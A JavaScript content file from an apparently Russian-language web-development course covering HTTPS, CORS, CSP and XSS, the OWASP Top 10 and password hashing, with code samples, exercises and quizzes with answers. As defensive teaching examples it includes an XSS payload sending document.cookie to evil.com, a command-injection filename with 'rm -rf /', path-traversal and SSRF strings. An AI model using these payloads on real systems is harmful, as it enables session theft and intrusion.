// Раздел 10. Веб-безопасность

registerContent('https', {
  intro: `<p><b>HTTPS</b> — это HTTP поверх шифрования <b>TLS</b> (наследник SSL). Он защищает трафик от подслушивания и подмены: пароли, cookie и токены
    в публичном Wi-Fi видны любому, если сайт работает по голому HTTP. Сегодня HTTPS — обязательный минимум для любого сайта и API, и он бесплатен.</p>`,
  theory: [
    {
      title: 'Что даёт TLS',
      html: `<ul>
          <li><b>Конфиденциальность</b> — данные зашифрованы, посредник видит только домен и объём трафика.</li>
          <li><b>Целостность</b> — данные нельзя незаметно изменить по пути (например, вставить рекламу или вредоносный скрипт).</li>
          <li><b>Аутентичность</b> — сертификат доказывает, что вы говорите с настоящим <code>bank.ru</code>, а не с поддельным сервером.</li>
        </ul>`,
    },
    {
      title: 'TLS-рукопожатие',
      html: `<ol>
          <li>Клиент: «привет, вот поддерживаемые версии TLS и шифры».</li>
          <li>Сервер: выбранный шифр + <b>сертификат</b> (публичный ключ домена, подписанный центром сертификации).</li>
          <li>Клиент проверяет сертификат: подписан доверенным CA, не истёк, выдан на этот домен.</li>
          <li>Стороны по алгоритму обмена ключами (ECDHE) вырабатывают общий <b>сеансовый ключ</b>, не передавая его по сети.</li>
          <li>Дальше данные шифруются быстрым симметричным шифром (AES-GCM, ChaCha20).</li>
        </ol>
        <p>Асимметричная криптография (пара ключей) используется только для проверки и договорённости, а основной трафик шифруется симметрично — так быстрее.
        В TLS 1.3 рукопожатие занимает всего один сетевой круг.</p>`,
    },
    {
      title: 'Сертификаты и Let\'s Encrypt',
      html: `<p><b>Центр сертификации</b> (CA) подтверждает, что вы владеете доменом, и подписывает сертификат. Браузеры доверяют списку корневых CA, встроенному в ОС.</p>
        <p><b>Let's Encrypt</b> выдаёт сертификаты бесплатно и автоматически по протоколу ACME (срок жизни — 90 дней, продление автоматическое). Инструменты: <code>certbot</code>,
        встроенная поддержка в Caddy, Traefik; облачные балансировщики и Cloudflare делают это за вас.</p>
        <p class="note">Обычно TLS «терминируют» на reverse proxy (Nginx, Caddy, балансировщик): снаружи HTTPS, а до приложения внутри сети — HTTP. Приложение на FastAPI само сертификатами не занимается.</p>`,
    },
    {
      title: 'Правильная настройка',
      html: `<ul>
          <li>Редирект всего HTTP → HTTPS (<code>301</code>).</li>
          <li><b>HSTS</b>: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code> — браузер больше никогда не пойдёт на сайт по HTTP, даже если пользователь введёт <code>http://</code>.</li>
          <li>Только TLS 1.2 и 1.3, современные шифры (генератор конфигов Mozilla SSL Config).</li>
          <li>Cookie с флагом <code>Secure</code>.</li>
          <li>Нет <b>смешанного контента</b>: HTTPS-страница не грузит скрипты по HTTP.</li>
          <li>Мониторинг срока действия сертификата.</li>
        </ul>
        <p>Проверить свой сайт: <a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">SSL Labs</a> — цель оценка A или A+.</p>`,
    },
  ],
  examples: [
    {
      title: 'Посмотреть сертификат',
      lang: 'bash',
      code: String.raw`
# Цепочка сертификатов и параметры соединения
openssl s_client -connect github.com:443 -servername github.com </dev/null | head -20

# Срок действия
echo | openssl s_client -connect github.com:443 2>/dev/null | openssl x509 -noout -dates -subject -issuer

# Подробности TLS через curl
curl -vI https://github.com 2>&1 | grep -E "SSL|TLS|subject|expire"`,
    },
    {
      title: 'Проверка срока сертификата из Python',
      lang: 'python',
      code: String.raw`
import socket
import ssl
from datetime import datetime, timezone

def cert_days_left(host: str, port: int = 443) -> int:
    ctx = ssl.create_default_context()           # проверяет цепочку и имя хоста
    with socket.create_connection((host, port), timeout=5) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as tls:
            cert = tls.getpeercert()
            print(host, tls.version(), cert["issuer"][1][0][1])
    expires = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
    return (expires - datetime.now(timezone.utc)).days

for h in ("github.com", "yandex.ru"):
    print("осталось дней:", cert_days_left(h))`,
    },
    {
      title: 'HTTPS локально для разработки',
      lang: 'bash',
      code: String.raw`
# mkcert создаёт локальный CA и доверенный сертификат для localhost
mkcert -install
mkcert localhost 127.0.0.1

uvicorn main:app --ssl-keyfile localhost+1-key.pem --ssl-certfile localhost+1.pem
# https://localhost:8000 — без предупреждений браузера`,
    },
  ],
  tasks: [
    {
      title: 'Аудит сайтов',
      level: 'легко',
      text: `<p>Проверьте на SSL Labs три сайта: крупный банк, ваш любимый маленький сайт и любой госсайт. Сравните оценки, версии TLS, наличие HSTS. Что снижает оценку?</p>`,
    },
    {
      title: 'Монитор сертификатов',
      level: 'средне',
      text: `<p>На основе примера напишите скрипт, который проверяет список доменов из файла и выводит предупреждение для сертификатов, истекающих менее чем через 14 дней,
        и ошибку для невалидных (просроченный, неверное имя). Проверьте на <a href="https://badssl.com" target="_blank" rel="noopener">badssl.com</a>: <code>expired.badssl.com</code>, <code>wrong.host.badssl.com</code>.</p>`,
      hint: `<p>Ошибки проверки — исключение <code>ssl.SSLCertVerificationError</code>, его атрибут <code>verify_message</code> объясняет причину.</p>`,
    },
  ],
  quiz: [
    { q: 'Что защищает HTTPS?', options: ['Только пароли', 'Конфиденциальность, целостность и подлинность сервера', 'От SQL-инъекций', 'От DDoS'], answer: 1 },
    { q: 'Что делает заголовок HSTS?', options: ['Шифрует cookie', 'Заставляет браузер всегда использовать HTTPS для домена', 'Ускоряет TLS', 'Выдаёт сертификат'], answer: 1 },
    { q: 'Чем шифруется основной трафик после рукопожатия?', options: ['RSA', 'Симметричным шифром (AES, ChaCha20)', 'Base64', 'MD5'], answer: 1 },
    { q: 'Где обычно настраивают TLS для Python-приложения в продакшене?', options: ['В коде каждого эндпоинта', 'На reverse proxy или балансировщике', 'В базе данных', 'В браузере'], answer: 1 },
  ],
  resources: [
    { title: 'Как работает HTTPS (комикс)', url: 'https://howhttps.works/ru/' },
    { title: 'Mozilla SSL Configuration Generator', url: 'https://ssl-config.mozilla.org/' },
    { title: "Let's Encrypt: как это работает", url: 'https://letsencrypt.org/ru/how-it-works/' },
  ],
});

registerContent('cors', {
  intro: `<p>Классическая ситуация: фронтенд на <code>http://localhost:3000</code> обращается к API на <code>http://localhost:8000</code>, и в консоли браузера ошибка
    «blocked by CORS policy». <b>CORS</b> (Cross-Origin Resource Sharing) — механизм, которым сервер разрешает браузеру читать свои ответы со страниц других origin.</p>`,
  theory: [
    {
      title: 'Зачем ограничение',
      html: `<p>По <b>Same-Origin Policy</b> (тема «Браузеры») JavaScript со страницы <code>evil.com</code> не может читать ответы от <code>bank.ru</code>, даже если браузер отправит туда cookie пользователя.
        Иначе любой сайт мог бы читать вашу почту и счета.</p>
        <p class="note">CORS — защита <b>пользователей браузера</b>, а не вашего API. curl, Postman и серверы на CORS не смотрят. Это не замена аутентификации.</p>`,
    },
    {
      title: 'Простые запросы',
      html: `<p>Для «простых» запросов (GET/HEAD/POST со стандартными заголовками и <code>Content-Type</code> формы) браузер отправляет запрос с заголовком <code>Origin: http://localhost:3000</code>.
        Если в ответе есть <code>Access-Control-Allow-Origin: http://localhost:3000</code> (или <code>*</code>), JS получает ответ; иначе браузер его скрывает.</p>
        <p>Важно: сам запрос <b>до сервера доходит</b> и выполняется — блокируется только чтение ответа.</p>`,
    },
    {
      title: 'Preflight-запросы',
      html: `<p>Для остальных запросов (PUT, DELETE, PATCH, <code>Content-Type: application/json</code>, заголовок <code>Authorization</code>) браузер сначала шлёт «предварительный» запрос:</p>
        <pre><code>OPTIONS /api/notes
Origin: http://localhost:3000
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, content-type</code></pre>
        <p>Сервер отвечает, что разрешено:</p>
        <pre><code>Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Max-Age: 600</code></pre>
        <p>Только после этого браузер отправит настоящий запрос. <code>Max-Age</code> кэширует разрешение, чтобы не делать preflight каждый раз.</p>`,
    },
    {
      title: 'Cookie и настройка в продакшене',
      html: `<ul>
          <li>Чтобы браузер отправлял cookie на другой origin: на клиенте <code>fetch(url, {credentials: "include"})</code>, на сервере <code>Access-Control-Allow-Credentials: true</code>.</li>
          <li>С credentials нельзя использовать <code>*</code> — только конкретный origin.</li>
          <li>Указывайте <b>явный список</b> разрешённых origin. Опасная ошибка — «отражать» любой пришедший Origin вместе с <code>Allow-Credentials: true</code>: это открывает API для любого сайта.</li>
          <li>Часто проще избежать CORS совсем: отдавать фронтенд и API с одного домена через reverse proxy (<code>site.ru</code> и <code>site.ru/api</code>).</li>
        </ul>`,
    },
  ],
  examples: [
    {
      title: 'CORS в FastAPI',
      lang: 'python',
      code: String.raw`
import os
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

ALLOWED = os.environ.get("CORS_ORIGINS", "http://localhost:3000").split(",")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED,                # явный список, не ["*"] при credentials
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=600,
)`,
    },
    {
      title: 'Проверить CORS через curl',
      lang: 'bash',
      code: String.raw`
curl -i -X OPTIONS http://127.0.0.1:8000/notes \
  -H "Origin: http://localhost:3000" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: authorization"

# То же с чужого origin — заголовков Access-Control-Allow-* в ответе не будет
curl -i -X OPTIONS http://127.0.0.1:8000/notes -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE"`,
    },
    {
      title: 'Запрос с фронтенда',
      lang: 'javascript',
      code: String.raw`
// Страница на http://localhost:3000
const res = await fetch("http://localhost:8000/notes", {
  method: "POST",
  headers: { "Content-Type": "application/json", "Authorization": "Bearer " + token },
  body: JSON.stringify({ title: "Из браузера" }),
});
console.log(res.status, await res.json());`,
    },
  ],
  tasks: [
    {
      title: 'Воспроизведите ошибку CORS',
      level: 'средне',
      text: `<p>Создайте <code>index.html</code> с кнопкой, которая через <code>fetch</code> создаёт заметку в вашем API. Отдайте страницу командой <code>python -m http.server 3000</code>.
        Без настройки CORS посмотрите ошибку в консоли и запросы во вкладке Network (виден ли OPTIONS?). Добавьте CORSMiddleware и проверьте снова.</p>`,
    },
    {
      title: 'Найдите уязвимость',
      level: 'средне',
      text: `<p>Разработчик написал middleware: <code>response.headers["Access-Control-Allow-Origin"] = request.headers.get("origin")</code> и <code>Access-Control-Allow-Credentials: true</code>.
        Почему это опасно? Опишите атаку.</p>`,
      solution: `<p>Сервер разрешает любой origin вместе с cookie. Злоумышленник размещает на <code>evil.com</code> скрипт, который делает <code>fetch("https://api.site.ru/me", {credentials: "include"})</code>.
        Браузер жертвы отправит её сессионную cookie, сервер «разрешит» evil.com, и скрипт прочитает и отправит себе личные данные пользователя. Нужен белый список origin.</p>`,
    },
  ],
  quiz: [
    { q: 'Кого защищает CORS?', options: ['Сервер от DDoS', 'Пользователей браузера от чтения их данных чужими сайтами', 'API от curl', 'Базу данных'], answer: 1 },
    { q: 'Когда браузер отправляет preflight OPTIONS?', options: ['Перед каждым запросом', 'Перед «непростыми» запросами: PUT, DELETE, JSON, Authorization', 'Только для картинок', 'Только по HTTPS'], answer: 1 },
    { q: 'Можно ли использовать <code>Allow-Origin: *</code> вместе с <code>Allow-Credentials: true</code>?', options: ['Да', 'Нет, браузер это запрещает', 'Только для GET', 'Только локально'], answer: 1 },
    { q: 'Блокирует ли CORS выполнение простого POST на сервере?', options: ['Да, запрос не доходит до сервера', 'Нет, запрос выполняется, браузер лишь не даёт JS прочитать ответ', 'Только при ошибке', 'Только для JSON'], answer: 1 },
  ],
  resources: [
    { title: 'MDN: CORS', url: 'https://developer.mozilla.org/ru/docs/Web/HTTP/CORS' },
    { title: 'FastAPI: CORS', url: 'https://fastapi.tiangolo.com/ru/tutorial/cors/' },
  ],
});

registerContent('csp', {
  intro: `<p><b>Content Security Policy</b> — заголовок, которым сервер сообщает браузеру, откуда странице разрешено загружать скрипты, стили, картинки и куда отправлять запросы.
    Это главная «страховочная сетка» против <b>XSS</b>: даже если злоумышленник внедрил <code>&lt;script&gt;</code> в страницу, браузер его не выполнит.</p>`,
  theory: [
    {
      title: 'XSS — от чего защищаемся',
      html: `<p><b>Cross-Site Scripting</b> — внедрение чужого JavaScript в вашу страницу. Например, комментарий <code>&lt;script&gt;fetch("https://evil.com/?c="+document.cookie)&lt;/script&gt;</code>
        выводится без экранирования — и выполняется у каждого, кто открыл страницу. Скрипт работает с правами пользователя на вашем сайте.</p>
        <ul>
          <li><b>Stored XSS</b> — вредоносный код сохранён в БД (комментарии, профили).</li>
          <li><b>Reflected XSS</b> — код приходит в параметре URL и сразу выводится в ответ.</li>
          <li><b>DOM XSS</b> — фронтенд сам вставляет данные через <code>innerHTML</code>.</li>
        </ul>
        <p><b>Основная защита</b> — экранирование при выводе (шаблонизаторы Jinja2, React делают это по умолчанию). CSP — второй уровень на случай ошибки.</p>`,
    },
    {
      title: 'Директивы CSP',
      html: `<table>
          <tr><th>Директива</th><th>Что ограничивает</th></tr>
          <tr><td><code>default-src</code></td><td>Всё, что не указано отдельно</td></tr>
          <tr><td><code>script-src</code></td><td>Источники JavaScript</td></tr>
          <tr><td><code>style-src</code></td><td>Стили</td></tr>
          <tr><td><code>img-src</code>, <code>font-src</code>, <code>media-src</code></td><td>Картинки, шрифты, медиа</td></tr>
          <tr><td><code>connect-src</code></td><td>Куда можно делать fetch/XHR/WebSocket</td></tr>
          <tr><td><code>frame-ancestors</code></td><td>Кто может встраивать страницу в iframe (защита от clickjacking)</td></tr>
          <tr><td><code>form-action</code></td><td>Куда можно отправлять формы</td></tr>
        </table>
        <p>Значения: <code>'self'</code> (свой origin), конкретные домены, <code>'none'</code>, <code>'nonce-abc123'</code> (разрешить инлайн-скрипт с этим одноразовым атрибутом).
        Опасные значения, которые сводят защиту на нет: <code>'unsafe-inline'</code> и <code>'unsafe-eval'</code> в <code>script-src</code>.</p>`,
    },
    {
      title: 'Внедрение без поломок',
      html: `<ol>
          <li>Начните с <code>Content-Security-Policy-Report-Only</code> — браузер не блокирует, а только сообщает о нарушениях (в консоль и на <code>report-to</code> URL).</li>
          <li>Соберите нарушения, допишите нужные источники.</li>
          <li>Переключите на блокирующий <code>Content-Security-Policy</code>.</li>
        </ol>
        <p>Для JSON-API хватает строгой политики <code>default-src 'none'; frame-ancestors 'none'</code> — API не отдаёт HTML.</p>
        <p>Другие полезные заголовки безопасности: <code>X-Content-Type-Options: nosniff</code>, <code>Referrer-Policy: strict-origin-when-cross-origin</code>, <code>Permissions-Policy</code>.</p>`,
    },
  ],
  examples: [
    {
      title: 'Строгая политика с nonce',
      lang: 'http',
      code: String.raw`
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  style-src 'self' https://fonts.googleapis.com;
  font-src https://fonts.gstatic.com;
  img-src 'self' data: https://cdn.myshop.ru;
  connect-src 'self' https://api.myshop.ru;
  frame-ancestors 'none';
  form-action 'self'`,
      explain: `<p>В реальном заголовке это одна строка. Инлайн-скрипт выполнится, только если у него <code>nonce="r4nd0m"</code> — значение генерируется заново на каждый ответ.</p>`,
    },
    {
      title: 'Заголовки безопасности в FastAPI',
      lang: 'python',
      code: String.raw`
import secrets
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.middleware("http")
async def security_headers(request: Request, call_next):
    nonce = secrets.token_urlsafe(16)
    request.state.csp_nonce = nonce
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; script-src 'self' 'nonce-{nonce}'; "
        "frame-ancestors 'none'; form-action 'self'"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response

@app.get("/", response_class=HTMLResponse)
def page(request: Request):
    n = request.state.csp_nonce
    return f"""<h1>CSP</h1>
<script nonce="{n}">console.log("разрешённый скрипт")</script>
<script>alert("а этот браузер заблокирует")</script>"""`,
    },
    {
      title: 'Экранирование — основная защита',
      lang: 'python',
      code: String.raw`
from html import escape

comment = '<script>fetch("https://evil.com/?c=" + document.cookie)</script>'

unsafe = f"<p>{comment}</p>"          # XSS
safe = f"<p>{escape(comment)}</p>"    # &lt;script&gt;... — выводится как текст
print(safe)

# Jinja2 экранирует автоматически при autoescape=True:
# {{ comment }}        — безопасно
# {{ comment | safe }} — отключает экранирование, используйте только для доверенного HTML`,
    },
  ],
  tasks: [
    {
      title: 'Устройте и остановите XSS',
      level: 'средне',
      text: `<p>Сделайте на FastAPI страницу «гостевая книга»: форма отправляет сообщение, страница выводит все сообщения (HTML собирается f-строкой без экранирования).
        Отправьте сообщение <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code> и убедитесь, что код выполняется. Исправьте двумя способами: экранированием и CSP — и проверьте, что каждый по отдельности останавливает атаку.</p>`,
    },
    {
      title: 'Изучите чужие политики',
      level: 'легко',
      text: `<p>Посмотрите заголовок <code>Content-Security-Policy</code> у github.com и у пары других сайтов (DevTools → Network → документ → Headers). Есть ли у них <code>unsafe-inline</code>? Что разрешено в <code>connect-src</code>?
        Проверьте свои сайты на <a href="https://securityheaders.com" target="_blank" rel="noopener">securityheaders.com</a>.</p>`,
    },
  ],
  quiz: [
    { q: 'От какой атаки в первую очередь защищает CSP?', options: ['SQL-инъекция', 'XSS', 'Подбор пароля', 'Подмена DNS'], answer: 1 },
    { q: 'Что делает <code>frame-ancestors \'none\'</code>?', options: ['Запрещает iframe на странице', 'Запрещает встраивать страницу в чужие iframe (clickjacking)', 'Блокирует картинки', 'Отключает JS'], answer: 1 },
    { q: 'Как безопасно внедрять CSP на работающем сайте?', options: ['Сразу самую строгую политику', 'Сначала в режиме Report-Only, собрать нарушения, потом включить', 'Только на выходных', 'Через robots.txt'], answer: 1 },
    { q: 'Основная защита от XSS:', options: ['CORS', 'Экранирование данных при выводе', 'HTTPS', 'Хеширование'], answer: 1 },
  ],
  resources: [
    { title: 'MDN: Content Security Policy', url: 'https://developer.mozilla.org/ru/docs/Web/HTTP/CSP' },
    { title: 'Google CSP Evaluator', url: 'https://csp-evaluator.withgoogle.com/' },
  ],
});

registerContent('owasp', {
  intro: `<p><b>OWASP</b> (Open Worldwide Application Security Project) — сообщество по безопасности веб-приложений. Его список <b>OWASP Top 10</b> — самые частые и опасные классы уязвимостей.
    Это обязательный минимум знаний для бэкендера: большинство взломов используют именно их, а не экзотические атаки.</p>`,
  theory: [
    {
      title: 'OWASP Top 10 (2021)',
      html: `<table>
          <tr><th>#</th><th>Категория</th><th>Пример</th></tr>
          <tr><td>A01</td><td><b>Нарушение контроля доступа</b></td><td><code>GET /orders/1002</code> отдаёт чужой заказ (IDOR)</td></tr>
          <tr><td>A02</td><td>Криптографические ошибки</td><td>Пароли в MD5, HTTP без TLS</td></tr>
          <tr><td>A03</td><td><b>Инъекции</b></td><td>SQL-инъекция, XSS, инъекция команд ОС</td></tr>
          <tr><td>A04</td><td>Небезопасный дизайн</td><td>Сброс пароля по «секретному вопросу»</td></tr>
          <tr><td>A05</td><td>Неверная конфигурация</td><td>DEBUG=True в проде, открытая админка, ключи по умолчанию</td></tr>
          <tr><td>A06</td><td>Уязвимые компоненты</td><td>Старые библиотеки с известными CVE</td></tr>
          <tr><td>A07</td><td>Ошибки аутентификации</td><td>Нет лимита попыток входа, слабые пароли</td></tr>
          <tr><td>A08</td><td>Нарушение целостности</td><td>Небезопасная десериализация (<code>pickle</code>), непроверенные обновления</td></tr>
          <tr><td>A09</td><td>Недостаточное логирование</td><td>Взлом не замечен месяцами</td></tr>
          <tr><td>A10</td><td><b>SSRF</b></td><td>Сервер скачивает URL от пользователя и обращается к внутренней сети</td></tr>
        </table>`,
    },
    {
      title: 'IDOR — самая частая ошибка бэкенда',
      html: `<p><b>Insecure Direct Object Reference</b>: эндпоинт проверяет, что пользователь вошёл, но не проверяет, что объект принадлежит <i>ему</i>.
        Меняем id в URL — получаем чужие данные. Защита: каждый запрос к данным фильтруется по владельцу (<code>WHERE id = ? AND user_id = ?</code>), а не только по id.</p>
        <p class="note">Непредсказуемые UUID вместо 1, 2, 3 затрудняют перебор, но <b>не заменяют</b> проверку прав.</p>`,
    },
    {
      title: 'Инъекции',
      html: `<p>Общий принцип: данные пользователя попадают в <b>код</b> другого интерпретатора (SQL, HTML, shell, LDAP, шаблон).</p>
        <ul>
          <li>SQL — параметризованные запросы / ORM (тема SQLite).</li>
          <li>HTML — экранирование + CSP (тема CSP).</li>
          <li>Shell — не используйте <code>os.system</code> и <code>shell=True</code> с данными пользователя; передавайте аргументы списком: <code>subprocess.run(["convert", path, "out.png"])</code>.</li>
          <li>Пути к файлам — проверяйте на <code>../</code> (path traversal).</li>
          <li>Десериализация — никогда <code>pickle.loads</code> и <code>yaml.load</code> без <code>SafeLoader</code> для недоверенных данных.</li>
        </ul>`,
    },
    {
      title: 'SSRF и общие принципы',
      html: `<p><b>SSRF</b>: функция «загрузить аватар по URL» — злоумышленник передаёт <code>http://169.254.169.254/latest/meta-data/</code> (метаданные облака с ключами) или <code>http://localhost:6379</code>.
        Защита: белый список доменов, запрет внутренних IP после резолвинга, отдельная сеть для таких запросов.</p>
        <p><b>Принципы</b>, закрывающие большинство проблем:</p>
        <ul>
          <li>не доверяйте ничему, что пришло от клиента — валидируйте всё на сервере;</li>
          <li>запрет по умолчанию (deny by default), минимальные права;</li>
          <li>защита в несколько слоёв (defense in depth);</li>
          <li>обновляйте зависимости, сканируйте их (<code>pip-audit</code>, Dependabot);</li>
          <li>логируйте события безопасности: входы, отказы в доступе, смену паролей.</li>
        </ul>`,
    },
  ],
  examples: [
    {
      title: 'IDOR и исправление',
      lang: 'python',
      code: String.raw`
# УЯЗВИМО: любой вошедший пользователь читает любой заказ
@app.get("/orders/{order_id}")
def get_order(order_id: int, user=Depends(current_user), db=Depends(get_db)):
    order = db.get(Order, order_id)
    if not order:
        raise HTTPException(404)
    return order

# ИСПРАВЛЕНО: ищем только среди заказов текущего пользователя
@app.get("/orders/{order_id}")
def get_order(order_id: int, user=Depends(current_user), db=Depends(get_db)):
    order = db.scalars(
        select(Order).where(Order.id == order_id, Order.user_id == user.id)
    ).first()
    if not order:
        raise HTTPException(404)   # 404, а не 403: не раскрываем, что заказ существует
    return order`,
    },
    {
      title: 'Path traversal и инъекция команд',
      lang: 'python',
      code: String.raw`
import subprocess
from pathlib import Path

UPLOADS = Path("uploads").resolve()

def safe_path(filename: str) -> Path:
    path = (UPLOADS / filename).resolve()
    if not path.is_relative_to(UPLOADS):          # "../../etc/passwd" не пройдёт
        raise ValueError("Недопустимый путь")
    return path

# УЯЗВИМО: filename = "a.png; rm -rf /"
# os.system(f"convert uploads/{filename} thumb.png")

# БЕЗОПАСНО: аргументы списком, без shell
subprocess.run(["convert", str(safe_path("a.png")), "thumb.png"], check=True, timeout=30)`,
    },
    {
      title: 'Проверка зависимостей',
      lang: 'bash',
      code: String.raw`
pip install pip-audit
pip-audit -r requirements.txt
# Found 2 known vulnerabilities in 1 package
# Name     Version ID                  Fix Versions
# jinja2   3.1.2   GHSA-h5c8-rqwp-cp95 3.1.3

pip install bandit
bandit -r app/          # статический анализ: shell=True, pickle, хардкод паролей...`,
    },
  ],
  tasks: [
    {
      title: 'Аудит API заметок',
      level: 'средне',
      text: `<p>Пройдитесь по API заметок со списком OWASP Top 10. Проверьте как минимум: может ли пользователь A прочитать, изменить или удалить заметку пользователя B, перебирая id?
        Есть ли лимит попыток входа? Не отдаёт ли API traceback? Запустите <code>pip-audit</code> и <code>bandit</code>. Запишите найденное и исправьте.</p>`,
    },
    {
      title: 'Защищённая загрузка по URL',
      level: 'сложно',
      text: `<p>Сделайте эндпоинт <code>POST /avatar/from-url</code>, который скачивает картинку по ссылке. Защитите его от SSRF: только http/https, резолвинг домена и запрет приватных, loopback и link-local адресов,
        таймаут, ограничение размера (5 МБ), проверка, что это действительно картинка.</p>`,
      hint: `<p><code>ipaddress.ip_address(ip).is_private</code>, <code>.is_loopback</code>, <code>.is_link_local</code>. Учтите редиректы: отключите их (<code>allow_redirects=False</code>) или проверяйте каждый адрес.</p>`,
    },
    {
      title: 'Хакерская практика',
      level: 'средне',
      text: `<p>Пройдите первые задания на <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a> (бесплатно): SQL injection, Access control, XSS.
        Это легальные учебные стенды — понимание атаки лучше всего учит защите.</p>`,
    },
  ],
  quiz: [
    { q: 'Пользователь меняет <code>/orders/101</code> на <code>/orders/102</code> и видит чужой заказ. Как называется уязвимость?', options: ['XSS', 'IDOR (нарушение контроля доступа)', 'CSRF', 'SSRF'], answer: 1 },
    { q: 'Как безопасно вызвать внешнюю программу с именем файла от пользователя?', options: ['os.system(f"cmd {name}")', 'subprocess.run(f"cmd {name}", shell=True)', 'subprocess.run(["cmd", name]) после проверки пути', 'eval'], answer: 2 },
    { q: 'Что такое SSRF?', options: ['Подделка запроса браузером', 'Сервер по указке атакующего обращается к внутренним ресурсам', 'Инъекция в SQL', 'Подбор пароля'], answer: 1 },
    { q: 'Почему опасен <code>pickle.loads</code> для данных от пользователя?', options: ['Медленный', 'Позволяет выполнить произвольный код', 'Портит Unicode', 'Не работает с JSON'], answer: 1 },
  ],
  resources: [
    { title: 'OWASP Top 10', url: 'https://owasp.org/Top10/' },
    { title: 'OWASP Cheat Sheet Series', url: 'https://cheatsheetseries.owasp.org/' },
    { title: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security' },
  ],
});

registerContent('hashing', {
  intro: `<p>Пароли никогда не хранят в открытом виде и не шифруют — их <b>хешируют</b>. Если базу украдут (а это случается даже с крупными компаниями), злоумышленник не должен
    получить пароли: пользователи используют их на других сайтах. Важно не просто хешировать, а правильным — <b>медленным</b> — алгоритмом.</p>`,
  theory: [
    {
      title: 'Хеширование vs шифрование',
      html: `<ul>
          <li><b>Шифрование</b> обратимо: есть ключ — можно расшифровать. Украли ключ — украли все пароли.</li>
          <li><b>Хеширование</b> необратимо: из хеша нельзя получить исходную строку, можно только проверить совпадение — захешировать введённый пароль и сравнить.</li>
          <li><b>Кодирование</b> (Base64) — вообще не защита.</li>
        </ul>
        <p>Хеш-функция детерминирована (один вход — один выход), выход фиксированной длины, малейшее изменение входа полностью меняет результат.</p>`,
    },
    {
      title: 'Почему MD5 и SHA-256 не подходят для паролей',
      html: `<p><b>MD5</b> и <b>SHA-1</b> криптографически сломаны (найдены коллизии) — их нельзя использовать нигде, где важна безопасность.</p>
        <p><b>SHA-256</b> надёжен, но для паролей у него проблема — он <b>слишком быстрый</b>: видеокарта считает миллиарды хешей в секунду. Восьмисимвольный пароль перебирается за часы.</p>
        <p><b>Соль</b> — случайная строка, уникальная для каждого пользователя, добавляется к паролю перед хешированием. Без соли одинаковые пароли дают одинаковые хеши, и работают
        <b>радужные таблицы</b> — заранее посчитанные хеши популярных паролей.</p>
        <p class="note">SHA-256 подходит для контрольных сумм файлов, подписи данных (HMAC), хеширования длинных случайных токенов. Для паролей — нет.</p>`,
    },
    {
      title: 'Правильные алгоритмы',
      html: `<table>
          <tr><th>Алгоритм</th><th>Особенности</th></tr>
          <tr><td><b>Argon2id</b></td><td>Победитель Password Hashing Competition, рекомендация OWASP №1. Настраивается время, память, параллелизм; «тяжёл по памяти» — неудобен для видеокарт.</td></tr>
          <tr><td><b>scrypt</b></td><td>Тоже тяжёл по памяти, встроен в Python (<code>hashlib.scrypt</code>).</td></tr>
          <tr><td><b>bcrypt</b></td><td>Проверен с 1999 года, повсеместно поддерживается. Ограничение — пароль до 72 байт.</td></tr>
          <tr><td>PBKDF2</td><td>Используется, где нужна сертификация FIPS; требует сотен тысяч итераций.</td></tr>
        </table>
        <p>Все они: медленные специально (~50–500 мс на хеш), с солью внутри, с настраиваемой стоимостью, которую повышают по мере роста мощности компьютеров.
        Строка хеша содержит алгоритм, параметры и соль: <code>$argon2id$v=19$m=65536,t=3,p=4$соль$хеш</code>.</p>`,
    },
    {
      title: 'Практика работы с паролями',
      html: `<ul>
          <li>Используйте библиотеку (pwdlib, argon2-cffi, passlib), а не свою реализацию.</li>
          <li><b>Перехеширование</b>: при входе проверьте, не устарели ли параметры хеша, и если да — пересчитайте с новыми, пока у вас есть пароль в открытом виде.</li>
          <li>Ограничивайте число попыток входа (rate limiting) и сообщайте одинаково «неверный email или пароль».</li>
          <li>Требуйте длину от 8–12 символов и проверяйте по базе утёкших паролей (Have I Been Pwned), а не заставляйте «заглавную + цифру + спецсимвол».</li>
          <li>Предлагайте 2FA и passkeys.</li>
        </ul>`,
    },
  ],
  examples: [
    {
      title: 'Почему быстрые хеши плохи',
      lang: 'python',
      code: String.raw`
import hashlib
import time

start = time.perf_counter()
for i in range(1_000_000):
    hashlib.sha256(f"password{i}".encode()).hexdigest()
print(f"SHA-256: 1 000 000 хешей за {time.perf_counter() - start:.1f} с на одном ядре CPU")
# ~0.5 с. Видеокарта — в тысячи раз быстрее.

print(hashlib.md5(b"123456").hexdigest())
# e10adc3949ba59abbe56e057f20f883e — поищите эту строку в интернете`,
    },
    {
      title: 'Argon2 через pwdlib',
      lang: 'python',
      code: String.raw`
# pip install "pwdlib[argon2]"
from pwdlib import PasswordHash

hasher = PasswordHash.recommended()     # Argon2id с рекомендованными параметрами

stored = hasher.hash("correct horse battery staple")
print(stored)   # $argon2id$v=19$m=65536,t=3,p=4$...

print(hasher.verify("correct horse battery staple", stored))   # True
print(hasher.verify("wrong", stored))                          # False

# Проверка с перехешированием устаревших параметров
valid, new_hash = hasher.verify_and_update("correct horse battery staple", stored)
if valid and new_hash:
